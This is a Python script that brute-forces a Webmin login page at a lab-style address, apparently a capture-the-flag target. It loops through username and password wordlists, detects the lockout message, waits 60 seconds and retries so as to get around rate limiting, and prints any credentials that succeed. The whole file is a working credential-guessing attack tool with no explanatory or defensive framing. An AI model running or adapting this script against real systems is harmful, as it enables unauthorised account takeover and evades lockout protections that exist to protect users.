#!/usr/bin/python3

import requests
import urllib3
import ssl
import sys
from time import sleep
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create an SSL context with the server hostname
ssl._create_default_https_context = ssl._create_unverified_context

PROXIES = {
    'http': "http://127.0.0.1:8080",
    'https': "https://127.0.0.1:8080"
}

Cookie_header = {"Cookie": "testing=1"}
print('')

def send_post_request(target, username, password):
    POST_data = {
        "page": "%2F",
        "user": username,
        "pass": password
    }
    print(f"(*) Testing user={username}&pass={password} ...")
    response = requests.post(f"https://{target}/session_login.cgi", data=POST_data, headers=Cookie_header, verify=False)
    # response = requests.post(f"https://{target}/session_login.cgi", data=POST_data, headers=Cookie_header, verify=False, proxies=PROXIES)
    return response
    
target = "10.10.10.7:10000"

# Usernames wordlist
usernames = []
with open("usernames.txt", "r") as file:
    for line in file:
        # Remove leading and trailing whitespaces, and append the word to the list
        usernames.append(line.strip()) 

# Passwords wordlist
passwords = []
with open("passwords.txt", 'r') as file:
    for line in file:
        passwords.append(line.strip())

for username in usernames:
    for password in passwords:
        resp = send_post_request(target, username, password)

        if "Access denied for " in resp.text:
            username_break = username
            password_break = password
            print('')
            print('(-) The server is blocking us because of too many authentication failures.')
            print('(*) Sleep for 60 seconds, and then resend ...')
            sleep(60)
            print('')
            resp = send_post_request(target, username_break, password_break)
            if 'Login failed. Please try again.' not in resp.text and "Access denied for " not in resp.text:
                print('')
                print(f"(+) Login was successful with the credentials {username}:{password}")
                sys.exit()
        
        if 'Login failed. Please try again.' not in resp.text and "Access denied for " not in resp.text:
            print('')
            print(f"(+) Login was successful with the credentials {username}:{password}")
            sys.exit()
